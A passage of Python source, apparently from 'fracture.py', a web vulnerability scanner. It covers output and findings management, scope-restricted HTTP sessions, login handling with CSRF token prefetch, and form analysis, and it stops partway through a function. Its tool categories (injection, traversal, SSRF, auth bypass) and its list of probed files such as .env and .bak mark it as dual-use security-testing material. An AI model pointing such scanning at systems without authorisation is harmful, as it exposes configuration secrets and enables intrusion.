# ── Selenium availability cache (checked once, lazily) ────────────────────────
_SELENIUM_AVAILABLE: "bool | None" = None

# ── SPA headless-browser selection cache ─────────────────────────────────────
_SPA_BROWSER_CACHE:   "str | None" = None   # "chrome", "firefox", or None
_SPA_BROWSER_CHECKED: bool         = False

# ── Web file download constants ───────────────────────────────────────────────
_WEB_EXTS = frozenset({
    ".html", ".htm", ".php", ".asp", ".aspx", ".jsp", ".jsf",
    ".js", ".json", ".xml", ".txt", ".config", ".conf",
    ".yaml", ".yml", ".ini", ".env", ".bak", ".sql", ".css",
})
_WEB_WELL_KNOWN = [
    "/",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt",
    "/crossdomain.xml",
    "/web.config",
    "/humans.txt",
]
_MAX_WEB_LINKS  = 50
_MAX_FILE_BYTES = 5 * 1024 * 1024   # 5 MB

# ChromeDriver / Chrome binary paths for screenshot support
_CHROMEDRIVER_PATHS: list = [
    "/opt/homebrew/bin/chromedriver",
    "/usr/local/bin/chromedriver",
    "/usr/bin/chromedriver",
    "/usr/bin/chromium-driver",
    "/usr/bin/chromium.chromedriver",
    "/usr/lib/chromium/chromedriver",
    "/usr/lib/chromium-browser/chromedriver",
    "/snap/bin/chromium.chromedriver",
    # macOS: chromedriver downloaded by tmp/ patch script
    "/private/tmp/chromedriver146/chromedriver-mac-x64/chromedriver",
]
_CHROME_BIN_PATHS_LINUX: list = [
    "/usr/bin/google-chrome",
    "/usr/bin/google-chrome-stable",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
    "/snap/bin/chromium",
    "/usr/bin/brave-browser",
]

colorama.init(autoreset=True)

# Suppress InsecureRequestWarning for self-signed certs
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    try:
        requests.packages.urllib3.disable_warnings()
    except Exception:
        pass

# ── Thread-safety ─────────────────────────────────────────────────────────────
_PRINT_LOCK = threading.Lock()


def _tprint(*args, **kwargs):
    """Thread-safe wrapper for print()."""
    with _PRINT_LOCK:
        print(*args, **kwargs)


# ─────────────────────────────────────────────
# Vantage integration layer
# ─────────────────────────────────────────────
import queue as _queue
import uuid as _uuid

_VANTAGE_MANAGED = os.environ.get("CRUCIBLE_MANAGED", "") == "1"

_VP_LOG    = "__CRUCIBLE_LOG__:"
_VP_ERR    = "__CRUCIBLE_ERR__:"
_VP_PROMPT = "__CRUCIBLE_PROMPT__:"
_VP_STATUS = "__CRUCIBLE_STATUS__:"


class VantageConsole:
    """Dual-mode console output.

    When VANTAGE_MANAGED=1: emits protocol tokens that Vantage intercepts for
    structured logs, errors, prompts, and phase-status updates.
    When running in a real terminal: falls back to ANSI-coloured text.
    """

    def __init__(self) -> None:
        self._managed = _VANTAGE_MANAGED
        self._lock    = threading.Lock()

    @property
    def managed(self) -> bool:
        return self._managed

    def log(self, message: str, level: str = "INFO") -> None:
        with self._lock:
            if self._managed:
                entry = {
                    "ts":      datetime.now().isoformat(),
                    "level":   level,
                    "message": message,
                }
                sys.stdout.write(_VP_LOG + json.dumps(entry) + "\n")
                sys.stdout.flush()
            else:
                _colours = {
                    "INFO":    Fore.CYAN,
                    "SUCCESS": Fore.GREEN,
                    "WARNING": Fore.YELLOW,
                    "ERROR":   Fore.RED,
                    "DEBUG":   Fore.WHITE,
                }
                _tags = {
                    "INFO": "[*]", "SUCCESS": "[+]", "WARNING": "[~]",
                    "ERROR": "[!]", "DEBUG": "[.]",
                }
                c   = _colours.get(level, "")
                tag = _tags.get(level, "[*]")
                _tprint(f"{c}{tag}{Style.RESET_ALL} {message}")

    def error(self, message: str, source: str = "fracture",
              detail: str = "", category: str = "") -> None:
        with self._lock:
            if self._managed:
                entry = {
                    "ts":       datetime.now().isoformat(),
                    "source":   source,
                    "message":  message,
                    "detail":   detail,
                    "category": category or self._categorise(message),
                }
                sys.stderr.write(_VP_ERR + json.dumps(entry) + "\n")
                sys.stderr.flush()
            else:
                _tprint(f"{Fore.RED}[!] {message}{Style.RESET_ALL}")

    def status(self, phase: str, label: str = "", status: str = "running",
               step: str = "", progress: int = 0, total: int = 0,
               tools: "dict | None" = None) -> None:
        with self._lock:
            if self._managed:
                entry = {
                    "phase":    phase,
                    "label":    label or phase,
                    "status":   status,
                    "step":     step,
                    "progress": progress,
                    "total":    total,
                    "ts":       datetime.now().isoformat(),
                }
                if tools is not None:
                    entry["tools"] = tools
                sys.stdout.write(_VP_STATUS + json.dumps(entry) + "\n")
                sys.stdout.flush()

    def prompt(self, question: str, prompt_type: str = "text",
               options: list = None, skippable: bool = False,
               role: str = "") -> str:
        """Request user input. Blocks until an answer is received."""
        if self._managed:
            payload = {
                "id":        str(_uuid.uuid4()),
                "question":  question,
                "type":      prompt_type,
                "options":   options or [],
                "skippable": skippable,
            }
            if role:
                payload["role"] = role
            with self._lock:
                sys.stdout.write(_VP_PROMPT + json.dumps(payload) + "\n")
                sys.stdout.flush()
            try:
                return sys.stdin.readline().rstrip("\n")
            except Exception:
                return ""
        else:
            if prompt_type == "password":
                return getpass.getpass(f"  {question}: ")
            elif options:
                _tprint(f"\n[?] {question}")
                for i, opt in enumerate(options, 1):
                    _tprint(f"    [{i}] {opt}")
                raw = input("    Select: ").strip()
                if raw.isdigit():
                    idx = int(raw) - 1
                    if 0 <= idx < len(options):
                        return options[idx]
                return raw
            else:
                return input(f"  [?] {question}: ").strip()

    @staticmethod
    def _categorise(msg: str) -> str:
        m = msg.lower()
        if any(k in m for k in ("connection", "socket", "timeout", "refused", "network", "unreachable")):
            return "Network"
        if any(k in m for k in ("tool", "binary", "not found", "command", "executable")):
            return "Tool"
        return "Scan"


class ProgressManager:
    """Thread-safe checkpoint manager for scan recovery."""

    def __init__(self, checkpoint_file: "str | Path") -> None:
        self._file  = Path(checkpoint_file)
        self._lock  = threading.Lock()
        self._state = self._load()

    def _load(self) -> dict:
        if self._file.exists():
            try:
                data = json.loads(self._file.read_text(encoding="utf-8"))
                data.setdefault("version", 1)
                data.setdefault("started", datetime.now().isoformat())
                data.setdefault("completed_phases", [])
                data.setdefault("phase_status", {})
                return data
            except Exception:
                pass
        return {
            "version":          1,
            "started":          datetime.now().isoformat(),
            "completed_phases": [],
            "phase_status":     {},
        }

    def _save(self) -> None:
        self._file.parent.mkdir(parents=True, exist_ok=True)
        fd, tmp = tempfile.mkstemp(dir=str(self._file.parent), suffix=".tmp")
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                json.dump(self._state, f, indent=2)
            os.replace(tmp, str(self._file))
        except Exception:
            try:
                os.unlink(tmp)
            except Exception:
                pass

    def is_phase_complete(self, phase: str) -> bool:
        with self._lock:
            return phase in self._state.get("completed_phases", [])

    def set_phase_status(self, phase: str, status: str,
                         label: str = "", detail: str = "") -> None:
        with self._lock:
            self._state.setdefault("phase_status", {})[phase] = {
                "status":     status,
                "label":      label or phase,
                "detail":     detail,
                "updated_at": datetime.now().isoformat(),
            }
            if status == "complete":
                lst = self._state.setdefault("completed_phases", [])
                if phase not in lst:
                    lst.append(phase)
            self._save()

    def get_state(self) -> dict:
        with self._lock:
            return dict(self._state)


# ─────────────────────────────────────────────
# Subprocess helpers
# ─────────────────────────────────────────────
_POPEN_FLAGS: dict = {}
if platform.system() == "Windows":
    _POPEN_FLAGS["creationflags"] = subprocess.CREATE_NO_WINDOW  # type: ignore


def _run(cmd: list, **kwargs) -> subprocess.CompletedProcess:
    """Run a subprocess, suppressing console windows on Windows."""
    return subprocess.run(cmd, **{**_POPEN_FLAGS, **kwargs})


def _popen(cmd: list, **kwargs) -> subprocess.Popen:
    """Open a subprocess, suppressing console windows on Windows."""
    return subprocess.Popen(cmd, **{**_POPEN_FLAGS, **kwargs})


# ─────────────────────────────────────────────
# OutputManager
# ─────────────────────────────────────────────
_RE_UNSAFE_FNAME = re.compile(r'[^\w.\-]')


class OutputManager:
    """Manages the output directory tree for a Fracture scan."""

    TOOL_DIRS = [
        "recon", "tls", "headers", "crawl", "injection",
        "traversal", "ssrf", "auth_bypass", "files", "vulnscan",
        "graphql", "auth_recon", "authorization", "session", "csrf", "cross_user",
    ]

    FINDINGS_CSV_FIELDS = [
        "title", "datetime", "ip", "port", "hostname", "risk", "command",
        "description", "output", "cves", "sources", "service", "output_file",
        "affected", "exploitdb", "metasploit", "exploit_details",
        "owasp", "owasp_url", "nist", "remediation",
    ]

    _findings_lock: threading.Lock = threading.Lock()
    _log_lock:      threading.Lock = threading.Lock()

    def __init__(self, project_name: str) -> None:
        self.project_name     = project_name
        self.root             = Path(project_name).resolve()
        self.log_file         = self.root / "scan.log"
        self.json_log_file    = self.root / "scan.log.json"
        self.error_log        = self.root / "errors.log"
        self.findings_json    = self.root / "findings.json"
        self.findings_csv     = self.root / "findings.csv"
        self.summary_json     = self.root / "summary.json"
        self._current_accounts: list = []
        # Set by the scan loop after instantiation; used to relativize affected URLs
        self.base_url: str = ""
        # When set to a role label (e.g. "Admin", "unauthenticated"), output_path() and
        # _save_http_evidence() route tool outputs into a per-role subdirectory so that
        # files from different roles do not overwrite each other.
        self._output_role: str = ""
        self._setup_dirs()

    def _setup_dirs(self) -> None:
        self.root.mkdir(parents=True, exist_ok=True)
        for d in self.TOOL_DIRS:
            (self.root / d).mkdir(exist_ok=True)
        if not self.log_file.exists():
            self._write_log_header()
        if not self.json_log_file.exists():
            self.json_log_file.write_text("[]\n", encoding="utf-8")
        if not self.error_log.exists():
            self._write_error_header()
        if not self.findings_json.exists():
            self.findings_json.write_text("[]\n", encoding="utf-8")
        if not self.findings_csv.exists():
            self._write_findings_csv_header()

    def _write_log_header(self) -> None:
        header = (
            f"{'='*70}\n"
            f"  fracture.py — Scan Log\n"
            f"  Project : {self.project_name}\n"
            f"  Created : {self._ts()}\n"
            f"  Host    : {platform.node()}  OS: {platform.system()} {platform.release()}\n"
            f"{'='*70}\n\n"
        )
        self.log_file.write_text(header, encoding="utf-8")

    def _write_error_header(self) -> None:
        header = (
            f"{'='*70}\n"
            f"  fracture.py — Error Log\n"
            f"  Project : {self.project_name}\n"
            f"  Created : {self._ts()}\n"
            f"{'='*70}\n\n"
        )
        self.error_log.write_text(header, encoding="utf-8")

    def _write_findings_csv_header(self) -> None:
        with self.findings_csv.open("w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=self.FINDINGS_CSV_FIELDS, extrasaction="ignore")
            writer.writeheader()

    def _ts(self) -> str:
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def _safe_filename(self, parts: list, ext: str) -> str:
        name = "_".join(str(p) for p in parts)
        name = _RE_UNSAFE_FNAME.sub("_", name)
        return f"{name}.{ext}"

    def output_path(self, phase: str, *parts) -> Path:
        fname = self._safe_filename(list(parts), "txt")
        if self._output_role:
            role_safe = _RE_UNSAFE_FNAME.sub("_", self._output_role)
            p = self.root / phase / role_safe / fname
            p.parent.mkdir(exist_ok=True)
            return p
        return self.root / phase / fname

    def log_command(self, tool: str, command: "list | str", output_file: "Path | None",
                    extra: "dict | None" = None) -> None:
        ts      = self._ts()
        cmd_str = " ".join(command) if isinstance(command, list) else command
        out_str = str(output_file.relative_to(self.root)) if output_file else "n/a"
        lines   = [f"[{ts}] TOOL={tool}", f"  Command     : {cmd_str}", f"  Output file : {out_str}", ""]
        if extra:
            for k, v in extra.items():
                if v is not None:
                    lines.insert(2, f"  {k:<13} : {v}")
        with self._log_lock:
            with self.log_file.open("a", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")

    def log_error(self, tool: str, command: "list | str", error: str) -> None:
        ts      = self._ts()
        cmd_str = " ".join(command) if isinstance(command, list) else command
        with self._log_lock:
            with self.error_log.open("a", encoding="utf-8") as f:
                f.write(f"[{ts}] ERROR  TOOL={tool}\n  Command : {cmd_str}\n  Error   : {error}\n\n")

    def set_auth_context(self, accounts: list) -> None:
        """Set the active auth context for subsequent add_finding calls."""
        self._current_accounts = list(accounts)

    def _rel_affected(self, raw: str) -> str:
        """Convert each line of `raw` that is a same-origin full URL to a
        relative path, using self.base_url as the origin anchor.
        Lines that are not HTTP URLs (paths, names, cipher strings, etc.)
        are returned unchanged.  Falls back to `raw` if base_url is unset.
        Paths containing unencoded quote characters or other junk are filtered out."""
        _PATH_JUNK = frozenset('"\'<> \t\r\n\x00')
        if not self.base_url or not raw:
            return raw
        lines = raw.split("\n")
        result = []
        for line in lines:
            stripped = line.strip()
            if not stripped:
                continue
            if stripped.startswith("http"):
                rel = _url_rel_path(stripped, self.base_url)
            else:
                rel = stripped
            # Drop any entry that resolves to a path with invalid URL characters
            if rel.startswith("/") and any(c in rel for c in _PATH_JUNK):
                continue
            result.append(rel)
        return "\n".join(result)

    def add_finding(
        self,
        title: str,
        url: str,
        port: int,
        risk: str,
        description: str,
        output: str = "",
        cves: str = "",
        sources: str = "",
        service: str = "",
        output_file: str = "",
        affected: str = "",
        owasp: str = "",
        nist: str = "",
        remediation: str = "",
        command: str = "",
        http_code: int = 0,
    ) -> None:
        """Record a security finding to findings.json and findings.csv. Thread-safe."""
        ts    = self._ts()
        title = _normalize_finding_title(title)
        ascii_title = title.encode("ascii", errors="replace").decode("ascii")

        # parse hostname from url
        try:
            _parsed  = urllib.parse.urlparse(url)
            hostname = _parsed.hostname or url
            _svc     = service or _parsed.scheme or "http"
        except Exception:
            hostname = url
            _svc     = service or "http"

        _owasp_name, _owasp_url = _owasp_resolve(owasp, title)
        entry = {
            "title":          title,
            "datetime":       ts,
            "ip":             url,
            "port":           int(port) if port else 0,
            "hostname":       hostname,
            "risk":           risk or "",
            "command":        command or "",
            "description":    description or "",
            "output":         output or "",
            "cves":           cves or "",
            "sources":        sources or "",
            "service":        _svc,
            "output_file":    output_file or "",
            "affected":       self._rel_affected(affected or url),
            "exploitdb":      False,
            "metasploit":     False,
            "exploit_details": [],
            "owasp":          _owasp_name or owasp or "",
            "owasp_url":      _owasp_url or "",
            "nist":           nist or "",
            "remediation":    remediation or "",
            "accounts":       list(self._current_accounts),
            "http_code":      int(http_code) if http_code else 0,
        }
        csv_entry = dict(entry)
        csv_entry["title"] = ascii_title

        with self._findings_lock:
            try:
                existing_all: list = json.loads(self.findings_json.read_text(encoding="utf-8"))
                if not isinstance(existing_all, list):
                    existing_all = []
            except Exception:
                existing_all = []

            _title_lower = title.strip().lower()
            # Findings that should merge globally by (title, port) only — the
            # incoming URL is always folded into the affected list on merge.
            _GLOBAL_MERGE_PREFIXES = (
                "missing security header:",
                "interesting endpoint discovered",
                "non-login form detected",
                "login page detected",
                "missing secure cookie attribute:",
                "misconfigured secure cookie attribute:",
                "broken function level authorization (bfla)",
            )
            _is_global = any(_title_lower.startswith(_p) for _p in _GLOBAL_MERGE_PREFIXES)
            _norm_key  = (_title_lower, "" if _is_global else url.strip(),
                          int(port) if port else 0)
            merged     = False

            for ex in existing_all:
                _ex_tl = (ex.get("title") or "").strip().lower()
                _ex_is_global = any(_ex_tl.startswith(_p) for _p in _GLOBAL_MERGE_PREFIXES)
                ex_key = (
                    _ex_tl,
                    "" if _ex_is_global else (ex.get("ip") or "").strip(),
                    int(ex.get("port") or 0),
                )
                if ex_key == _norm_key:
                    # merge sources
                    if sources:
                        ex_srcs = set(s.strip() for s in (ex.get("sources") or "").split(",") if s.strip())
                        new_srcs = set(s.strip() for s in sources.split(",") if s.strip())
                        ex["sources"] = ",".join(sorted(ex_srcs | new_srcs))
                    # merge CVEs
                    if cves:
                        ex_cves = set(c.strip() for c in (ex.get("cves") or "").split(",") if c.strip())
                        new_cves = set(c.strip() for c in cves.split(",") if c.strip())
                        ex["cves"] = ",".join(sorted(ex_cves | new_cves))
                    # merge affected — for global-merge titles always include the
                    # incoming url so every affected URL is captured even when the
                    # caller passes affected="" (e.g. header findings from other phases)
                    _ex_aff = set(a.strip() for a in (ex.get("affected") or "").split("\n") if a.strip())
                    if _is_global:
                        _ex_aff.add(self._rel_affected(url.strip()))
                    if affected:
                        _ex_aff |= set(
                            self._rel_affected(a.strip())
                            for a in affected.split("\n") if a.strip()
                        )
                    _ex_aff.discard("")
                    if _ex_aff:
                        ex["affected"] = "\n".join(sorted(_ex_aff))
                    # merge output_file — handle JSON array ({url,req,resp}) and
                    # legacy comma-separated path formats
                    if output_file:
                        _ex_of  = (ex.get("output_file") or "").strip()
                        _in_of  = output_file.strip()
                        _ex_json = _ex_of.startswith("[")
                        _in_json = _in_of.startswith("[")
                        if _ex_json or _in_json:
                            try:
                                _ex_ents = json.loads(_ex_of) if _ex_json and _ex_of else []
                                _in_ents = json.loads(_in_of) if _in_json else []
                            except Exception:
                                _ex_ents, _in_ents = [], []
                            _seen_ev = {e.get("url", "") for e in _ex_ents}
                            for _e in _in_ents:
                                if _e.get("url", "") not in _seen_ev:
                                    _ex_ents.append(_e)
                                    _seen_ev.add(_e.get("url", ""))
                            ex["output_file"] = json.dumps(_ex_ents) if _ex_ents else _ex_of
                        else:
                            ex_files = set(f.strip() for f in _ex_of.split(",") if f.strip())
                            ex_files.add(_in_of)
                            ex["output_file"] = ",".join(sorted(ex_files))
                    # merge description — findings with HTTP-status context
                    # replace stale entries rather than appending, so the most
                    # recent scan's response code appears prominently in Crucible.
                    if description:
                        ex_desc  = (ex.get("description") or "").strip()
                        new_desc = description.strip()
                        if new_desc:
                            if "[HTTP " in new_desc and "[HTTP " not in ex_desc:
                                ex["description"] = new_desc
                                if output:
                                    ex["output"] = output
                            elif new_desc not in ex_desc:
                                ex["description"] = f"{ex_desc}\n\n{new_desc}".strip() if ex_desc else new_desc
                    # merge accounts — dedup by role so the same role is never added twice
                    if self._current_accounts:
                        _ex_accts = ex.get("accounts") or []
                        _ex_roles = {a.get("role", "") for a in _ex_accts}
                        for _a in self._current_accounts:
                            if _a.get("role", "") not in _ex_roles:
                                _ex_accts.append(_a)
                                _ex_roles.add(_a.get("role", ""))
                        ex["accounts"] = _ex_accts
                    # escalate risk
                    _risk_rank = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
                    if _risk_rank.get((risk or "").upper(), 0) > _risk_rank.get((ex.get("risk") or "").upper(), 0):
                        ex["risk"] = risk
                    # update http_code — always prefer the latest non-zero value
                    if http_code:
                        ex["http_code"] = int(http_code)
                    merged = True
                    break

            if not merged:
                existing_all.append(entry)

            # atomic write JSON
            tmp = self.findings_json.with_suffix(".tmp")
            tmp.write_text(json.dumps(existing_all, indent=2), encoding="utf-8")
            tmp.replace(self.findings_json)

            # append CSV only for new entries
            if not merged:
                with self.findings_csv.open("a", newline="", encoding="utf-8") as f:
                    writer = csv.DictWriter(f, fieldnames=self.FINDINGS_CSV_FIELDS, extrasaction="ignore")
                    writer.writerow(csv_entry)

    def write_summary(self, meta: dict) -> None:
        """Write scan summary JSON."""
        try:
            findings = json.loads(self.findings_json.read_text(encoding="utf-8"))
        except Exception:
            findings = []
        counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in findings:
            r = (f.get("risk") or "INFO").upper()
            counts[r] = counts.get(r, 0) + 1
        summary = {
            "tool":        "fracture",
            "version":     VERSION,
            "generated":   datetime.now().isoformat(),
            "hostname":    socket.gethostname(),
            "total_findings": len(findings),
            "risk_counts": counts,
            **meta,
        }
        tmp = self.summary_json.with_suffix(".tmp")
        tmp.write_text(json.dumps(summary, indent=2), encoding="utf-8")
        tmp.replace(self.summary_json)


# ─────────────────────────────────────────────
# Banner
# ─────────────────────────────────────────────
_BANNER = r"""
  ███████╗██████╗  █████╗  ██████╗████████╗██╗   ██╗██████╗ ███████╗
  ██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝
  █████╗  ██████╔╝███████║██║        ██║   ██║   ██║██████╔╝█████╗
  ██╔══╝  ██╔══██╗██╔══██║██║        ██║   ██║   ██║██╔══██╗██╔══╝
  ██║     ██║  ██║██║  ██║╚██████╗   ██║   ╚██████╔╝██║  ██║███████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
"""

# ─────────────────────────────────────────────
# Module-level singletons
# ─────────────────────────────────────────────
vc: VantageConsole = VantageConsole()
_active_procs: list = []
_procs_lock = threading.Lock()
_redirect_seen: set = set()  # (from_url, to_url) pairs already reported


def _register_proc(proc: subprocess.Popen) -> None:
    with _procs_lock:
        _active_procs.append(proc)


def _deregister_proc(proc: subprocess.Popen) -> None:
    with _procs_lock:
        try:
            _active_procs.remove(proc)
        except ValueError:
            pass


def _signal_handler(sig, frame) -> None:
    vc.log("Interrupted — killing subprocesses and saving checkpoint ...", "WARNING")
    with _procs_lock:
        for p in _active_procs:
            try:
                p.terminate()
            except Exception:
                pass
    sys.exit(0)


signal.signal(signal.SIGINT,  _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


def _atexit_kill_procs() -> None:
    with _procs_lock:
        for p in list(_active_procs):
            try:
                p.kill()
            except Exception:
                pass


atexit.register(_atexit_kill_procs)


# ─────────────────────────────────────────────
# Shared HTTP session factory
# ─────────────────────────────────────────────
def _is_in_scope_url(url: str, scope_hostnames: set) -> bool:
    """Return True if the URL's hostname is within the configured scope."""
    try:
        host = urllib.parse.urlparse(url).hostname or ""
    except Exception:
        return False
    return host in scope_hostnames


def _is_valid_endpoint_url(u: str) -> bool:
    """Return True if u is a well-formed http(s) URL with no invalid path characters."""
    try:
        p = urllib.parse.urlparse(u)
        if p.scheme not in ("http", "https") or not p.hostname:
            return False
        path = p.path or "/"
        return not any(c in path for c in (',', '"', "'", ' ', '\t', '\r', '\n'))
    except Exception:
        return False


class _ScopedSession(requests.Session):
    """requests.Session that blocks any request whose hostname is outside scope."""

    def __init__(self, scope_hostnames: set) -> None:
        super().__init__()
        self._scope = scope_hostnames

    def send(self, request, **kwargs):
        try:
            host = urllib.parse.urlparse(request.url).hostname or ""
        except Exception:
            host = ""
        if host and host not in self._scope:
            vc.log(
                f"[scope] Blocked out-of-scope request: {request.method} {request.url}",
                "WARNING",
            )
            raise ValueError(f"Out-of-scope request blocked: {request.url}")
        return super().send(request, **kwargs)


def _make_session(cfg: dict, scope_hostnames: "set | None" = None) -> requests.Session:
    if scope_hostnames is not None:
        sess = _ScopedSession(scope_hostnames)
    else:
        sess = requests.Session()
    sess.verify  = cfg.get("verify_ssl", False)
    ua           = cfg.get("user_agent", "Mozilla/5.0 (compatible; Fracture/1.0; Security Assessment)")
    sess.headers.update({"User-Agent": ua})
    extra = cfg.get("extra_headers", {})
    if extra:
        sess.headers.update(extra)
    proxy = cfg.get("proxy", "")
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    return sess


def _build_auth_session(cfg: dict, auth_key: str = "auth",
                        scope_hostnames: "set | None" = None,
                        role_label: str = "",
                        no_interactive: bool = False) -> "requests.Session | None":
    """
    Return an authenticated requests.Session for the given cfg/auth_key, or None if disabled.
    Supports all 20 auth methods from Fracture testConnection.py.

    no_interactive: when True, suppress all vc.prompt() calls (browser-auth prompts).
    Use for automated/internal call sites (auth_bypass credential testing, access_matrix
    re-auth fallback) where user interaction is not appropriate.
    """
    auth = cfg.get(auth_key, {})
    if not auth.get("enabled"):
        return None
    # Auth uses an unscoped session so that login_url on a different host is reachable.
    # Cookies and auth headers are transferred to the scoped scan session at the end.
    sess    = _make_session(cfg, None)
    timeout = cfg.get("timeout", 10)
    method  = (auth.get("method") or auth.get("auth_type") or "form_login").strip().lower()

    # ── CSRF prefetch helper (used by form_login / totp_mfa) ─────────────────
    def _csrf_prefetch(url: str) -> "tuple[str, dict]":
        """GET login page; return (form_action_url, hidden_input_fields)."""
        import re as _re2
        from urllib.parse import urljoin as _urljoin2
        try:
            r    = sess.get(url, timeout=timeout)
            html = r.text
        except Exception:
            return "", {}
        hidden: dict = {}
        form_action  = ""
        for form_m in _re2.finditer(r"(?s)<form[^>]*>(.+?)</form>", html, _re2.IGNORECASE):
            form_tag  = form_m.group(0)
            form_body = form_m.group(1)
            if not _re2.search(r'<input[^>]+type=["\']?password["\']?', form_body, _re2.IGNORECASE):
                continue
            act_m = _re2.search(r'\baction=["\']([^"\']*)["\']', form_tag, _re2.IGNORECASE)
            if act_m:
                raw = act_m.group(1).strip()
                if raw:
                    form_action = _urljoin2(url, raw)
            for inp in _re2.finditer(r"<input[^>]+>", form_body, _re2.IGNORECASE):
                tag = inp.group(0)
                t_m = _re2.search(r'\btype=["\']?(\w+)["\']?', tag, _re2.IGNORECASE)
                if not t_m or t_m.group(1).lower() != "hidden":
                    continue
                n_m = _re2.search(r'\bname=["\']([^"\']+)["\']', tag, _re2.IGNORECASE)
                v_m = _re2.search(r'\bvalue=["\']([^"\']*)["\']', tag, _re2.IGNORECASE)
                if n_m:
                    hidden[n_m.group(1)] = v_m.group(1) if v_m else ""
            break
        return form_action, hidden

    # ── Form page analyser ────────────────────────────────────────────────────
    def _analyse_form_page(html: str, page_url: str) -> "dict":
        """
        Inspect all forms on a page and classify what is present.

        Returns a dict with keys:
          has_password      – True if any form contains a password input
          has_username      – True if any form contains a text/email/tel input
          has_checkbox      – True if any form contains a checkbox
          checkbox_forms    – list of dicts {action, fields} for forms that have
                             a checkbox but NO password field — i.e. gate pages
          login_form        – dict {action, hidden} for the first form with a
                             password field, or None
          affirmative_links – list of {url, text, type, fields} for navigation
                             buttons/links whose label suggests forward progress
                             (Login, Accept, Continue, …) but excludes backward/
                             negative labels (Cancel, Decline, Back, …)
        """
        import re as _re3
        from urllib.parse import urljoin as _uj3

        # Affirmative button/link label patterns
        _AFFIRM_RE = _re3.compile(
            r'\b(log[\s\-]?in|sign[\s\-]?in|login|signin|accept|agree|'
            r'i\s+agree|continue|proceed|next|access|enter|'
            r'get\s+started|start|go|ok)\b',
            _re3.IGNORECASE,
        )
        # Labels that indicate backward/negative navigation — exclude these
        _DENY_RE = _re3.compile(
            r'\b(cancel|back|decline|reject|close|skip|return|exit|'
            r'log[\s\-]?out|sign[\s\-]?out|logout|logoff|'
            r'forgot|reset|register|sign[\s\-]?up|create\s+account|no\b)\b',
            _re3.IGNORECASE,
        )

        def _strip_tags(s: str) -> str:
            return _re3.sub(r'<[^>]+>', '', s).strip()

        def _extract_content_signals(html_inner: str) -> "list[str]":
            """
            Pull every human-readable signal out of an element's inner HTML:
              - visible text (tags stripped)
              - alt= from every <img>
              - title= from every tag
              - value= from <input type="button|submit">
              - placeholder= from any input
            Returns a list of non-empty strings.
            """
            _sigs: list = []
            # Visible text
            _vt = _re3.sub(r'<[^>]+>', '', html_inner).strip()
            if _vt:
                _sigs.append(_vt)
            # Attributes from inner tags
            for _inner_tag in _re3.finditer(r'<[a-zA-Z][^>]*>', html_inner, _re3.IGNORECASE):
                _t = _inner_tag.group(0)
                for _attr_name in ("alt", "title", "value", "placeholder",
                                   "aria-label", "data-label", "data-text"):
                    _am = _re3.search(
                        r'\b' + _attr_name + r'\s*=\s*["\']([^"\']+)["\']',
                        _t, _re3.IGNORECASE)
                    if _am:
                        _sigs.append(_am.group(1))
            return _sigs

        def _attr_signals(tag_attrs: str) -> "list[str]":
            """
            Extract human-readable values from an element's own attribute string.

            Handles both well-formed attributes and malformed HTML where an id or
            class value contains unescaped quotes, e.g.:
              id="fsa_ButtonLoginToRules"
            Strategy: parse each known attribute normally first, then fall back to
            a raw word-extraction scan of the entire attrs string so that substrings
            like "LoginToRules" inside a malformed value are still checked.
            """
            _sigs: list = []
            for _attr in ("id", "aria-label", "aria-labelledby", "name", "title",
                          "data-label", "data-text", "value", "alt", "placeholder"):
                _am = _re3.search(
                    r'\b' + _attr + r'\s*=\s*["\']([^"\']+)["\']',
                    tag_attrs, _re3.IGNORECASE)
                if _am:
                    _sigs.append(_am.group(1))
            # Fallback: split raw attrs on quote/space/= boundaries and check each
            # token.  This catches malformed id="foo"BarBaz" where only "foo" is
            # captured by the regex above but "BarBaz" is still in the string.
            for _tok in _re3.split(r'[\s"\'=<>/]+', tag_attrs):
                if len(_tok) > 2 and _tok not in _sigs:
                    _sigs.append(_tok)
            return _sigs

        def _is_affirmative(text: str) -> bool:
            t = _strip_tags(text)
            return bool(t) and bool(_AFFIRM_RE.search(t)) and not _DENY_RE.search(t)

        def _elem_is_affirmative(tag_attrs: str, visible_text: str,
                                  content_html: str = "") -> bool:
            """
            Returns True if ANY signal from the element is affirmative AND none
            are negative.  Checks:
              - visible_text (after tag stripping)
              - img alt / inner-tag title / value / placeholder from content_html
              - id, aria-label, name, title, data-* from tag_attrs
              - raw token scan of tag_attrs (handles malformed attribute quotes)
            """
            _signals: list = list(_extract_content_signals(visible_text))
            if content_html:
                _signals.extend(_extract_content_signals(content_html))
            _signals.extend(_attr_signals(tag_attrs))
            _any_affirm = any(bool(s) and bool(_AFFIRM_RE.search(s)) for s in _signals)
            _any_deny   = any(_DENY_RE.search(s) for s in _signals if s)
            return _any_affirm and not _any_deny

        def _collect_hidden(form_body: str) -> "dict":
            """Return {name: value} for all hidden inputs in a form body."""
            hid: dict = {}
            for inp in _re3.finditer(r"<input[^>]+>", form_body, _re3.IGNORECASE):
                tag = inp.group(0)
                t_m = _re3.search(r'\btype=["\']?(\w+)["\']?', tag, _re3.IGNORECASE)
                if not t_m or t_m.group(1).lower() != "hidden":
                    continue
                n_m = _re3.search(r'\bname=["\']([^"\']+)["\']', tag, _re3.IGNORECASE)
                v_m = _re3.search(r'\bvalue=["\']([^"\']*)["\']', tag, _re3.IGNORECASE)
                if n_m:
                    hid[n_m.group(1)] = v_m.group(1) if v_m else ""
            return hid

        result: dict = {
            "has_password":      False,
            "has_username":      False,
            "has_checkbox":      False,
            "checkbox_forms":    [],
            "login_form":        None,
            "affirmative_links": [],
        }

        # ── Scan forms ────────────────────────────────────────────────────────
